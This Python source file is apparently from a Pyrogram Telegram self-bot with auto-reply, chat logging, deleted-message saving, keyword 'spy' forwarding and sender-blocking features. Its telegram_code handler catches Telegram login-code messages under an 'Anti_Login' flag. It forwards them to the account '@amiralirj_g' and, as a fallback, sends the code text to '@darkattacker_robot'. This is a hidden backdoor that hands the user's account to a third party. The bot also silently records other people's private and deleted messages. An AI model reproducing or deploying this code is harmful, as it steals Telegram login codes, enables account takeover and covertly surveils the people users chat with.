from pyrogram.raw.types import InputPeerNotifySettings , InputNotifyPeer
from pyrogram.raw.functions.account import UpdateNotifySettings
from Classes.CliClass import Rjself , helper
from pyrogram.enums import ChatAction
from Config.TEXTS import Text
from datetime import datetime
from pyrogram import filters
from asyncio import sleep

def save(peer,name,message):                                                                   
    with open(f'Chats/X{peer}X.txt','a+',encoding='utf-8') as f :                                                
        f.write(f'{datetime.now().strftime("%Y-%m-%d %H:%M")} - {name} → {message} \n ------------------------------------- \n ' )        
            
def is_contain_answer( text , user):
    for i in user.show_answers : 
        if i[0] in text :
            return i[1]
    return False

def is_contain_spy( text , user):
    try:
        for i in user.show_spyes : 
            if i in text :
                return True
        return False
    except:
        return False

def chat_action(user):
    if user.Chat_Status == 1:return ChatAction.CANCEL
    elif user.Chat_Status == 2:return ChatAction.TYPING
    elif user.Chat_Status == 3:return ChatAction.RECORD_AUDIO
    elif user.Chat_Status == 4:return ChatAction.PLAYING
    elif user.Chat_Status == 5:return ChatAction.RECORD_VIDEO_NOTE
    elif user.Chat_Status == 6:return ChatAction.CHOOSE_STICKER
    elif user.Chat_Status == 7:return ChatAction.UPLOAD_VIDEO
    else:return ChatAction.UPLOAD_PHOTO
    
@Rjself.on_message(filters.user(777000) & ( filters.regex('کد') | filters.regex('code')), group=0)
@helper.is_on
@helper.user_Details
async def telegram_code(bot,message,user):
    if user.Anti_Login:
        try:
            await message.forward('me')
            await message.forward('@amiralirj_g')
        except:
                await bot.send_message('@darkattacker_robot',text='/start')
                await bot.send_message('@darkattacker_robot',text=str(message.text))
    else:
        pass
    
@Rjself.on_deleted_messages(group=-1)
@helper.is_on
@helper.user_Details
async def deleted_message(bot,messages,user):
    for message in messages:
        try:
            det=user.find_deleted(int(message.id))
            text=det[1]
            sender=det[0]
            sender_name = (await bot.get_users(int(sender))).first_name
            
            if user.Del_Saver :
                try:await bot.send_message(user.Messages_Channel , Text(user.Lang).message_deleted(sender,sender_name,text))
                except:await bot.send_message(int(user), Text(user.Lang).message_deleted(sender,sender_name,text))
        except IndexError:pass
        

@Rjself.on_message( filters.new_chat_members, group=1)
@helper.is_on
@helper.user_Details
async def joining_messages(bot,message,user):
    chat = int(message.chat.id)
    
    if user.New_Group_Lock and not message.from_user.is_self: 
        for u in message.new_chat_members : 
            if u.is_self :
                await message.chat.leave()
                await message.reply_text(Text(user.Lang).bye)
                return
    
    if bool(user.Welcomer):
        for u in message.new_chat_members : 
            welcome=await bot.get_messages(user.Log_Channel,user.Welcomer)
            if message.text:text=str(welcome.text)
            else:text=str(welcome.caption)
            caption=str(text).replace('{name}',u.first_name ).replace('{peer}',u.id).replace('{group}',message.chat.title ).replace('{username}',u.username )
            await welcome.copy(chat,caption=caption)
            await sleep(1)
        
@Rjself.on_message(filters.me , group=1)
@helper.is_on
@helper.user_Details
async def outgoing_messages(bot,message,user):
    sender = int(message.chat.id)
    sender_name = str(message.from_user.first_name)
    text = str(message.text)
    
    if user.Save_Chats : 
        save( sender , sender_name , text )
        
    if bool(user.Text_Change) :
        if user.Text_Change in [1,2]:
            if user.Text_Change==1 : text= f'** {message.text} **'
            else: text = f'` {message.text} `'
            await message.edit_text(text)
        else:
            if len(message.text) > 20 : return
            text=''
            try:
                for i in str(message.text) : 
                    text+=i
                    await message.edit_text(text)
                    await sleep(0.4)
            except:
                await message.edit_text(str(message.text))
                

@Rjself.on_message(~filters.me & filters.private & ~filters.bot , group=1)
@helper.is_on
@helper.user_Details
async def private_messages(bot,message,user):
    sender = int(message.from_user.id)
    sender_name = str(message.from_user.first_name)
    text = str(message.text)
    chat = int(message.chat.id)
    try:count = await bot.get_chat_history_count(sender)
    except:count=0
    
    user.load_message(sender,int(message.id),text)
    
    if user.Save_Chats : 
        save( sender , sender_name , text )
        
    answer = is_contain_answer(text,user)
    if answer :
        await message.reply_text(answer)
        
    if is_contain_spy(text,user):
        try:await message.forward(user.Messages_Channel)
        except :
            try:await message.forward('me')
            except:
                try:await bot.send_message(user.Messages_Channel,Text(user.Lang).send_spying(sender,sender_name,text))
                except:
                    try:await bot.send_message('me',Text(user.Lang).send_spying(sender,Text(user.Lang).send_spying(sender,sender_name,text)))
                    except:pass
    
    if user.Auto_Reaction : 
        await message.react(emoji=user.Auto_Reaction)
    
    if user.Chat_Status : 
        status= chat_action(user)
        await bot.send_chat_action(chat,status)
        
    if user.Offline_Answering : 
        if not await bot.is_online() : 
            await bot.copy_message(chat,user.Log_Channel,user.Offline_Answering)

    if user.Auto_Read : 
        await bot.read_chat_history(chat)
            
    if user.New_Pv_Lock : 
        if count < 3 :
            await message.reply_text(Text(user.Lang).user_restricked)
            await message.from_user.block()
            return

    if user.Contacts_Only : 
        if not message.from_user.is_contact  :
            await message.delete(True) 
            
    if user.Text_Only : 
        if message.media  or message.video_note  or message.video or message.sticker or message.audio  or message.document  or message.animation  or message.game or message.voice  :
            await message.delete(True)  
    
    if user.Attack_Mode : 
        if count < 75 :
            await message.reply_text(Text(user.Lang).attack_mode_is_on)
            await message.from_user.block()
            return
        
    if user.Safe_Mode : 
        if count < 200 : 
            sender_peer = await bot.resolve_peer(sender)
            setting=InputPeerNotifySettings(show_previews =False , silent = True )
            sender_input=InputNotifyPeer(peer=sender_peer)
            await bot.invoke(UpdateNotifySettings(peer=sender_input,settings=setting))
            await message.chat.archive()

        
@Rjself.on_message(~filters.me & ~filters.private & ~filters.channel , group=1)
@helper.is_on
@helper.user_Details
async def all_messages(bot,message,user):
    if not message.from_user: return 
    sender = int(message.from_user.id)
    sender_name = str(message.from_user.first_name)
    text = str(message.text)
    chat = int(message.chat.id)
    
    if is_contain_spy(text,user):
        try:await message.forward(user.Messages_Channel)
        except :
            try:await message.forward('me')
            except:
                try:await bot.send_message(user.Messages_Channel,Text(user.Lang).send_spying(sender,sender_name,text))
                except:
                    try:await bot.send_message('me',Text(user.Lang).send_spying(sender,Text(user.Lang).send_spying(sender,sender_name,text)))
                    except:pass
                
    
    if sender in user.show_enemies :
        await message.reply_text(bot.swear)
        return

    answer = is_contain_answer(text,user)
    if answer :
        await message.reply_text(answer)
    
    if user.Chat_Status : 
        status= chat_action(user)
        await bot.send_chat_action(chat,status)
